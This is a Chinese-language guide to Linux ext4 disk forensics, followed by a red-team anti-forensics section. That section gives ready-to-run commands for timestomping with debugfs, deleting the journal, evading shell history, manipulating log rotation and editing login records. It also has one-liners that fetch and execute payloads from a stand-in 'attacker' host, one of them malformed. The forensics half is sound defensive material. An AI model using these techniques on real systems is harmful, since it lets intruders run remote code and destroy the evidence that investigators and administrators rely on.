# Linux 磁盘取证与反取证

> 理解 ext4 文件系统 artifact 的位置和含义，以及红队如何减少/清除磁盘痕迹

---

## 一、Linux 文件系统 Artifacts

### 1.1 ext4 核心结构

```
ext4 文件系统关键 artifact:
├─ Superblock — 文件系统元数据（挂载次数、最后挂载时间、最后写入时间）
├─ Inode — 文件元数据（权限、时间戳、数据块指针）
│   每个文件/目录有唯一 inode
│   包含 4 组时间戳: atime, mtime, ctime, crtime (birth)
├─ Journal (jbd2) — 文件系统操作日志
│   记录元数据变更（部分模式也记录数据变更）
│   用于崩溃恢复，但也是取证重要来源
├─ Directory Entry — 文件名到 inode 的映射
│   删除文件只移除 directory entry，inode 和数据可能保留
└─ Extended Attributes (xattr) — 文件附加元数据
    安全上下文（SELinux）、ACL、用户自定义属性
```

### 1.2 Inode 时间戳

| 时间戳 | 含义 | 更新条件 | 可被修改 |
|--------|------|---------|---------|
| atime | 最后访问时间 | 读取文件内容 | touch -a |
| mtime | 最后修改时间 | 写入文件内容 | touch -m |
| ctime | 最后变更时间 | 修改 inode（权限/属主/内容） | 仅 debugfs |
| crtime | 创建时间 (birth) | 文件创建 | 仅 debugfs |

```bash
# 查看文件完整时间戳
stat filename
# 输出包含 Access, Modify, Change, Birth(创建) 时间

# 查看 inode 详情
debugfs -R "stat <inode_number>" /dev/sda1

# 重要: ctime 无法通过普通 API 修改
# ctime 在任何 inode 修改时自动更新
# 因此 touch 修改 mtime 时会同时更新 ctime
# → 蓝队检测: mtime 远早于 ctime → timestomping
```

### 1.3 /var/log/ 日志文件

| 日志文件 | 内容 | 取证价值 |
|----------|------|---------|
| /var/log/auth.log | SSH 登录、sudo、su | 入侵时间线、横向移动 |
| /var/log/syslog | 系统事件 | 服务启停、异常 |
| /var/log/messages | 通用系统日志 (RHEL) | 同 syslog |
| /var/log/kern.log | 内核消息 | 驱动加载、内核漏洞利用 |
| /var/log/cron.log | Cron 执行记录 | 持久化定时任务 |
| /var/log/wtmp | 登录/注销记录（二进制） | 用户活动时间线 |
| /var/log/btmp | 失败登录记录（二进制） | 暴力破解 |
| /var/log/lastlog | 最后登录（二进制） | 最后登录时间/来源 |
| /var/log/faillog | 失败登录计数 | 锁定策略 |

### 1.4 /tmp/ 和 /dev/shm/ 痕迹

```
攻击者常用临时目录:
├─ /tmp/ — tmpfs 或磁盘
│   ├─ 重启后可能清除（取决于 tmpfs 配置）
│   ├─ 攻击者工具常落盘于此
│   └─ 文件名前缀 '.' 常用于隐藏
│
├─ /dev/shm/ — 共享内存（tmpfs）
│   ├─ 纯内存文件系统 → 重启后消失
│   ├─ 不留磁盘痕迹（不写入 ext4）
│   └─ 红队首选执行位置
│
└─ /run/ 和 /var/run/ — 运行时数据
    类似 tmpfs → 重启后消失

取证关注点:
├─ ls -la /tmp/ /dev/shm/ /var/tmp/ → 查找异常文件
├─ find /tmp -newer /tmp -mtime -7 → 最近 7 天修改的文件
├─ find /tmp -perm -111 → 可执行文件
└─ 检查 /tmp 中的 socket 文件 → 可能是 C2 通信
```

### 1.5 Bash History

```
命令历史文件:
├─ ~/.bash_history — Bash 默认
├─ ~/.zsh_history — Zsh
├─ ~/.sh_history — sh/ksh
├─ ~/.python_history — Python REPL
├─ ~/.mysql_history — MySQL 客户端
├─ ~/.psql_history — PostgreSQL 客户端
└─ ~/.node_repl_history — Node.js REPL

Bash History 配置:
├─ HISTFILE — 历史文件路径
├─ HISTSIZE — 内存中保留的命令数
├─ HISTFILESIZE — 文件中保留的命令数
├─ HISTCONTROL — 控制记录行为
│   ignorespace: 空格开头的命令不记录
│   ignoredups: 连续重复命令只记录一次
│   ignoreboth: 同时启用以上两个
└─ HISTTIMEFORMAT — 时间戳格式（如果设置了）
```

### 1.6 /proc/ 文件系统残留

```
/proc/ 是内存中的虚拟文件系统（不在磁盘上）
但实时取证（Live Response）时非常有价值:

/proc/[PID]/
├─ exe → 进程可执行文件路径（符号链接）
│   即使文件被删除，进程仍运行 → exe 显示 "(deleted)"
│   可通过 cp /proc/PID/exe /tmp/recovered 恢复文件
├─ cmdline → 完整命令行参数
├─ environ → 环境变量（可能包含密码/Token）
├─ fd/ → 打开的文件描述符
├─ maps → 内存映射（加载的库/文件）
├─ net/ → 网络连接信息
├─ cwd → 当前工作目录
└─ status → 进程状态（UID/GID/内存使用）

取证命令:
ls -la /proc/*/exe 2>/dev/null | grep deleted  # 已删除但仍运行的进程
cat /proc/*/cmdline | tr '\0' ' '               # 所有进程命令行
```

### 1.7 systemd Journal

```bash
# 查看所有日志
journalctl --no-pager

# 按时间范围
journalctl --since "2025-03-01" --until "2025-03-15"

# 按服务
journalctl -u sshd
journalctl -u cron

# 按优先级
journalctl -p err  # 只看错误及以上

# 导出为可分析格式
journalctl -o json > journal_export.json

# Journal 文件位置
# 持久化: /var/log/journal/<machine-id>/
# 非持久化: /run/log/journal/<machine-id>/（重启后消失）
```

### 1.8 Cron/At 历史

```
Cron 相关 artifact:
├─ /var/spool/cron/crontabs/<username> — 用户 crontab
├─ /etc/crontab — 系统 crontab
├─ /etc/cron.d/ — 系统 cron 目录
├─ /etc/cron.daily/ — 每日任务
├─ /etc/cron.hourly/ — 每小时任务
├─ /var/log/cron.log — Cron 执行日志
└─ /var/spool/at/ — at 任务

取证关注点:
├─ 新增的 crontab 条目 → 持久化
├─ 异常时间执行的任务 → C2 回连
├─ 调用网络命令的任务 → curl/wget/python reverse shell
└─ @reboot 条目 → 重启后持久化
```

### 1.9 用户 Home 目录 Artifacts

```
~/ 目录重要文件:
├─ .ssh/
│   ├─ authorized_keys — 攻击者添加的公钥（持久化）
│   ├─ known_hosts — SSH 连接过的主机
│   └─ config — SSH 配置（代理/跳板）
│
├─ .bashrc / .profile / .bash_profile
│   攻击者可能修改这些文件 → 每次登录执行恶意命令
│
├─ .gnupg/ — GPG 密钥
├─ .aws/ — AWS 凭据
├─ .kube/ — Kubernetes 配置
├─ .docker/ — Docker 配置
└─ .local/share/Trash/ — 回收站（GUI 删除）
```

---

## 二、分析工具

### 2.1 Sleuth Kit (TSK)

```bash
# 列出文件系统中所有文件（含已删除）
fls -r -p /path/to/image
# -r: 递归
# -p: 显示完整路径
# 已删除文件标记为 * 或 d/d

# 按 inode 提取文件内容
icat /path/to/image <inode_number> > recovered_file

# 生成时间线（bodyfile 格式）
fls -r -p -m "/" /path/to/image > bodyfile.txt
mactime -b bodyfile.txt > timeline.csv

# 查看文件系统信息
fsstat /path/to/image

# 查看 inode 详情
istat /path/to/image <inode_number>

# 搜索关键字
srch_strings /path/to/image | grep -i "password"

# 恢复所有已删除文件
tsk_recover -r /path/to/image /output_dir/
```

### 2.2 Autopsy

```
Autopsy — TSK 的 GUI 前端:
├─ 支持 E01/raw/vmdk 等格式
├─ 自动分析:
│   ├─ 文件恢复
│   ├─ 时间线分析
│   ├─ 关键字搜索
│   ├─ Hash 匹配（NSRL/自定义）
│   ├─ Web artifact 提取
│   └─ Email 提取
├─ 模块化 → 可扩展
└─ 适合大规模取证分析
```

### 2.3 debugfs

```bash
# 交互式 ext4 文件系统调试器
debugfs /dev/sda1

# 列出已删除的 inode
debugfs: lsdel

# 查看 inode 详情
debugfs: stat <inode>

# 导出文件（含已删除）
debugfs: dump <inode> /output/recovered_file

# 查看目录内容
debugfs: ls -l /tmp/

# 查看日志
debugfs: logdump

# ⛔ debugfs 也是红队工具 — 可直接修改 ctime!
# debugfs -w /dev/sda1
# debugfs: set_inode_field <inode> ctime 202001010000
```

### 2.4 extundelete / photorec

```bash
# extundelete — ext4 文件恢复
extundelete /dev/sda1 --restore-all
extundelete /dev/sda1 --restore-file path/to/file
extundelete /dev/sda1 --after 1609459200  # 指定时间后删除的

# photorec — 基于文件签名的恢复（跨文件系统）
photorec /dev/sda1
# 交互式选择恢复文件类型和输出目录
# 支持: jpg, png, pdf, doc, zip, elf, 等

# foremost — 类似 photorec
foremost -i /path/to/image -o /output_dir/
```

---

## 三、反取证技术（红队 OPSEC）

### 3.1 安全删除

```bash
# shred — 多次覆写文件内容
shred -vfz -n 3 target_file
# -v: 显示进度
# -f: 强制修改权限以允许写入
# -z: 最后一次用零填充（隐藏 shred 使用痕迹）
# -n 3: 覆写 3 次

# srm — 安全删除（需安装 secure-delete 包）
srm -sz target_file

# wipe — 另一个安全删除工具
wipe -f target_file

# 覆写可用空间（清除已删除文件的残留数据）
sfill -v /mount_point/

# dd 覆写
dd if=/dev/urandom of=target_file bs=4096
rm target_file

# ⛔ 注意: SSD/NVMe 上 shred 可能不完全有效
# SSD 有 wear leveling → 覆写可能写入新块
# 旧块数据仍可能通过固件级别读取
# 对策: SSD 使用 TRIM 命令 → fstrim / blkdiscard
```

### 3.2 Journal 清理

```bash
# ext4 journal 模式:
# journal (data=journal) → 数据和元数据都记录到 journal
# ordered (data=ordered) → 只记录元数据（默认）
# writeback (data=writeback) → 最少记录

# 查看当前 journal 模式
tune2fs -l /dev/sda1 | grep "Journal"
dumpe2fs /dev/sda1 | grep -i journal

# ⛔ 删除 journal（需要卸载文件系统）
umount /dev/sda1
tune2fs -O ^has_journal /dev/sda1
mount /dev/sda1 /mnt

# 清空 journal 内容（不删除 journal 功能）
# 通过大量写入填满 journal → 旧记录被覆盖
dd if=/dev/urandom of=/mnt/junk bs=1M count=100 && rm /mnt/junk

# ⛔ 风险: 删除 journal 会导致文件系统不一致风险增加
# 且管理员可能注意到 journal 消失
```

### 3.3 修改 atime/mtime/ctime

```bash
# 修改 atime 和 mtime（简单）
touch -t 202301011200.00 target_file    # 设置指定时间
touch -r /bin/ls target_file            # 匹配合法文件时间
touch -d "2023-01-01 12:00:00" target_file

# ⛔ ctime 无法通过 touch 修改
# ctime 在任何 inode 变更时自动更新

# 修改 ctime 的方法:
# 方法 1: debugfs（需要 root + 卸载分区）
umount /dev/sda1
debugfs -w /dev/sda1
debugfs: set_inode_field <inode> ctime 202301010000
debugfs: set_inode_field <inode> crtime 202301010000
# 重新挂载

# 方法 2: 修改系统时间（影响全局）
date -s "2023-01-01 12:00:00"
touch target_file  # ctime 现在是伪造的 2023 年时间
# 恢复正确时间
ntpdate pool.ntp.org

# 方法 3: 通过修改内核时间源（更隐蔽但复杂）

# 蓝队检测 timestomping:
# ├─ crtime > mtime → 逻辑异常（创建时间应最早）
# ├─ ctime ≠ mtime（当只修改了 mtime 不改 ctime）
# ├─ 时间精度异常（秒级精度缺少纳秒）
# └─ 对比 journal 记录与 inode 时间
```

### 3.4 In-memory Only Execution

```bash
# 方法 1: memfd_create — 内存中创建匿名文件
# Python 实现:
python3 -c "
import ctypes, os
libc = ctypes.CDLL('libc.so.6')
fd = libc.memfd_create(b'', 0)
os.write(fd, open('/path/to/payload', 'rb').read())
os.execve(f'/proc/self/fd/{fd}', ['payload'], os.environ)
"

# 方法 2: /dev/shm 执行（tmpfs，不写磁盘）
cp payload /dev/shm/.hidden
chmod +x /dev/shm/.hidden
/dev/shm/.hidden
rm /dev/shm/.hidden

# 方法 3: 管道执行（不落盘）
curl -s http://attacker/payload | bash
curl -s http://attacker/elf_payload | /dev/shm/.x; chmod +x /dev/shm/.x; /dev/shm/.x

# 方法 4: Python 内存执行
python3 -c "exec(__import__('urllib.request').request.urlopen('http://attacker/script.py').read())"

# 方法 5: Perl 内存执行
perl -e 'use LWP::Simple;eval(get("http://attacker/payload.pl"))'
```

### 3.5 History Evasion

```bash
# 方法 1: 禁用历史记录（当前会话）
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# 方法 2: 不记录历史
set +o history

# 方法 3: 空格前缀（需要 HISTCONTROL=ignorespace）
 sensitive_command  # 前面有空格 → 不记录

# 方法 4: 删除特定历史记录
history -d <line_number>

# 方法 5: 清空所有历史
history -c && history -w

# 方法 6: 使用其他 shell（不记录到 .bash_history）
sh -c 'sensitive_command'

# 方法 7: 直接执行不通过 shell
python3 -c "import os; os.system('sensitive_command')"

# ⛔ 最佳实践: 操作前第一步就是 unset HISTFILE
```

### 3.6 Log Rotation 操控

```bash
# 利用 logrotate 机制:
# /etc/logrotate.conf 和 /etc/logrotate.d/ 定义轮转规则

# 手动触发轮转 → 当前日志被压缩归档 → 新文件开始
logrotate -f /etc/logrotate.conf

# 或只轮转特定日志
logrotate -f /etc/logrotate.d/rsyslog

# 效果:
# ├─ auth.log 被重命名为 auth.log.1 并压缩
# ├─ 新的空 auth.log 开始
# ├─ 如果 rotate 计数较小 → 旧日志被覆盖
# └─ 但轮转操作本身会被记录到 syslog

# 修改 logrotate 配置（持久化影响）
# 减少保留数量:
# /etc/logrotate.d/rsyslog:
# rotate 1  # 只保留 1 个归档（原来可能是 7）
```

### 3.7 tmpfs 利用

```bash
# tmpfs 挂载点不写入磁盘 → 重启后消失
# 默认 tmpfs 位置:
mount | grep tmpfs
# /dev/shm → 共享内存
# /run → 运行时数据
# /tmp → 某些系统将 /tmp 挂载为 tmpfs

# 在 tmpfs 中操作 → 不产生磁盘 artifact
mkdir -p /dev/shm/.workspace
cd /dev/shm/.workspace
# 所有操作在内存中进行
# 完成后清理
rm -rf /dev/shm/.workspace

# 创建自定义 tmpfs 挂载
mount -t tmpfs -o size=100m tmpfs /mnt/ramdisk
# 在 /mnt/ramdisk 中操作
# 用完卸载
umount /mnt/ramdisk
```

---

## 四、对照表

| 蓝队取证手段 | 红队暴露 | 红队对策 |
|-------------|---------|---------|
| inode 时间戳分析 | 操作时间可见 | touch + debugfs 修改 ctime |
| ext4 journal 分析 | 文件操作记录 | 大量写入覆盖 journal |
| 已删除文件恢复 | rm 不擦除数据 | shred 安全删除 |
| /var/log/ 日志 | 登录/命令记录 | 精确编辑（不清空） |
| .bash_history | 命令历史 | unset HISTFILE |
| /tmp/ 文件分析 | 工具落盘 | 使用 /dev/shm 或 memfd_create |
| wtmp/lastlog | 登录记录 | utmpdump 编辑 |
| cron 分析 | 持久化任务 | 用完即删 |

---

## 参考链接

- [Sleuth Kit Documentation](https://www.sleuthkit.org/sleuthkit/)
- [Autopsy Digital Forensics](https://www.autopsy.com/)
- [ext4 Filesystem Documentation](https://www.kernel.org/doc/html/latest/filesystems/ext4/)
- [Linux Forensics - SANS](https://www.sans.org/white-papers/linux-forensics/)
